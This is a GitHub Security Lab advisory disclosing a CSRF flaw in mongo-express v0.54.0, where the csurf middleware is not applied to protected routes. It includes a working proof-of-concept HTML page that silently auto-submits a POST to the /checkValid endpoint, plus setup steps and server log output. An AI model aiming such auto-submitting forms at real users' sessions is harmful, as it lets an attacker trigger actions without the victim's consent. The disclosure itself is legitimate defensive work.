<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 13, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-130: CSRF in mongo-express</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>24/06/2020: Maintainers contacted.</li>
  <li>16/07/2020: Maintainers contacted for an update.</li>
  <li>19/08/2020: Maintainers contacted for an update.</li>
  <li>16/09/2020: Maintainers contacted for an update.</li>
  <li>12/02/2021: Maintainers contacted for an update.</li>
  <li>03/02/2021: Disclosure deadline reached.</li>
  <li>04/15/2021: Publication as per our <a href="https://securitylab.github.com/advisories/#policy">disclosure policy</a>.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>Mongo-express uses <a href="https://github.com/expressjs/csurf">csurf</a> middleware to protect the application against CSRF attacks. Unfortunately it does so in an incorrect way which leaves <code class="language-plaintext highlighter-rouge">mongo-express</code> vulnerable to the attack.</p>

<h2 id="product">Product</h2>

<p>mongo-express</p>

<h2 id="tested-version">Tested Version</h2>

<p>v0.54.0</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-innefective-protection-against-csfr">Issue 1: Innefective protection against CSFR</h3>

<p>Mongo-express uses <a href="https://github.com/expressjs/csurf">csurf</a> middleware to protect the application against CSRF attacks. Unfortunately it does so in an incorrect way which leaves <code class="language-plaintext highlighter-rouge">mongo-express</code> vulnerable to the attack.</p>

<p>The routes that need protection should add the <code class="language-plaintext highlighter-rouge">CSRF</code> protection handler before any other hander is executed in order to reject possible attacks from reaching critical parts of the application. Unfortunately, <code class="language-plaintext highlighter-rouge">mongo-express</code> does not set the handlers to any of the routes that need protection.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">CSRF</code>.</p>

<h4 id="resources">Resources</h4>

<p>To verify the vulnerability, we have provided a proof of concept that, when visited by an authenticated user, will issue a <code class="language-plaintext highlighter-rouge">POST</code> request automatically without the user noticing. The executed endpoint is <code class="language-plaintext highlighter-rouge">/checkValid</code> which should be harmless and will only execute javascript code inside a sandbox. We have chosen this endpoint specifically because it does not have destructive side effects on the application, but the vulnerability allows an attacker to issue requests to any of the exposed endpoints.</p>

<p>Place the following contents in a file named <code class="language-plaintext highlighter-rouge">index.html</code>.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>mongo-express<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"myform"</span> <span class="na">action=</span><span class="s">"http://localhost:8081/checkValid"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"document"</span> <span class="na">value=</span><span class="s">'1+1'</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">let</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">myform</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Start a webserver on the same directory where the previous file was created:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
127.0.0.1 - - <span class="o">[</span>22/Jun/2020 15:39:30] <span class="s2">"GET / HTTP/1.1"</span> 200 -
</code></pre></div></div>

<p>Browse to <code class="language-plaintext highlighter-rouge">http://localhost</code>, it is important that there is a logged-in user in the target <code class="language-plaintext highlighter-rouge">mongo-express</code> server and that the session was initiated in the same browser.</p>

<p>By inspecting the <code class="language-plaintext highlighter-rouge">mongo-express</code> console, it can be seen that the request has been made successfully.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0] Mongo Express server listening at http://localhost:8081
[0] basicAuth credentials are "admin:pass", it is recommended you change this in your config.js!
[0] Database connected
[0] Connected to local...
[0] POST /checkValid 200 9266.321 ms - 5
</code></pre></div></div>

<h2 id="resources-1">Resources</h2>

<ul>
  <li>https://github.com/mongo-express/mongo-express/issues/676</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered by the CodeQL JavaScript Team.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-130</code> in any communication regarding this issue.</p>


    